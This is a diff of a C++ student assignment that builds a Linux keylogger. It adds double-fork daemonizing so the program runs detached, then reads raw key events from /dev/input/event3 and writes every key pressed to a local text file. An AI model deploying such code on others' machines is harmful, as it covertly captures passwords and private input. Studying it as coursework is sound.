@@ -2,23 +2,12 @@
 // Spring 2023
 // Sophia Carlone
 // Keylogger Assignment
-// Description
-// Date
-// Video link
-
-/*
-1. creating a deamon process in c/c++
-2. keylogging to a string
-2 ways:
-    A. Reading keyboard events. On linux, reading them from /dev/input/eventX. (ie. event0)
-find correct index. root privilage?
-    B. Taking user input directly from stdin. (getchar(), etc.)
-3. writing the string in step 2 to a file.
-
-
+/* Description:
+This program records the keys the user presses and places them in a file. 
+The keys are taken from an event file
 */
-
-//My computer has keyboard on event 3
+// April 2nd, 2023
+// Video link
 
 #include <iostream>
 #include <fstream>
@@ -27,10 +16,8 @@ find correct index. root privilage?
 #include <sys/stat.h>
 #include <fcntl.h> //for O_RDONLY
 #include <vector>
-// #include <filesystem> //new library to learn about
 
 using namespace std;
-// using namespace std::filesystem;
 
 vector<string> keycodes = {
         "RESERVED",
@@ -107,42 +94,54 @@ vector<string> keycodes = {
 };
 
 int main(){
-    // ifstream in;
+    //fork off from parent process
+    pid_t pid = fork();
+    if (pid < 0) //failure checking
+        exit(EXIT_FAILURE);
+
+    if (pid > 0) //exit parent
+        exit(EXIT_SUCCESS);
+
+    //new session for child
+    if(setsid() < 0)
+        exit(EXIT_FAILURE);
+
+    //forking again
+    pid = fork();
+    if (pid < 0) //failure checking
+        exit(EXIT_FAILURE);
+
+    if (pid > 0) //exit parent
+        exit(EXIT_SUCCESS);
+
+    //keylogging and file operations
     ofstream out;
     string filename = "keys_logged.txt";
-    // string keyboard_device = "/dev/input/event3";
     int in = open("/dev/input/event3", O_RDONLY); //open event file
-    // int out = open("keys_logged.txt", O_APPEND); //open output file
+    
+    if (in == -1){ //catching failures with event file
+        cout << "problem opening event file" << endl;
+        exit(1);
+    }
 
     struct input_event ev; //for keyboard events
 
-    // in.open(keyboard_device);
-    out.open(filename);
+    out.open(filename); //open file
+
+    if(out.fail()){ //catch any failures
+        cout << "problem opening file" << endl;
+        exit(1);
+    }
 
     /*dont need to use threads because people can really only really give one keyboard input at a time
     *even if you try to press at the same time there is a slight difference. */
 
     while(true){
-        // write(out, "HELLO", sizeof("HELLO"));
-        // in.read(ev, sizeof(ev));
         read(in, &ev, sizeof(ev)); //read event file to event structure
         if((ev.type == EV_KEY) && (ev.value == 0)){ //EV_KEY means keyboard and a 0 value is a keypress
-            // cout << ev.code << endl;
-            // write(out, keycodes[ev.code].c_str(), sizeof(keycodes[ev.code]));
-            out << keycodes[ev.code] << endl;
+            out << keycodes[ev.code] << endl; //print to file
         }
    }
+
+   out.close();
 }
-
-
-
-//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    // char c; //character (do it one at a time or can I do something more efficient)
-
-    //     //getting keys
-    //     c = getchar();
-    //     out << c;
-    //     if( c == '}') break;
- 
-
- 
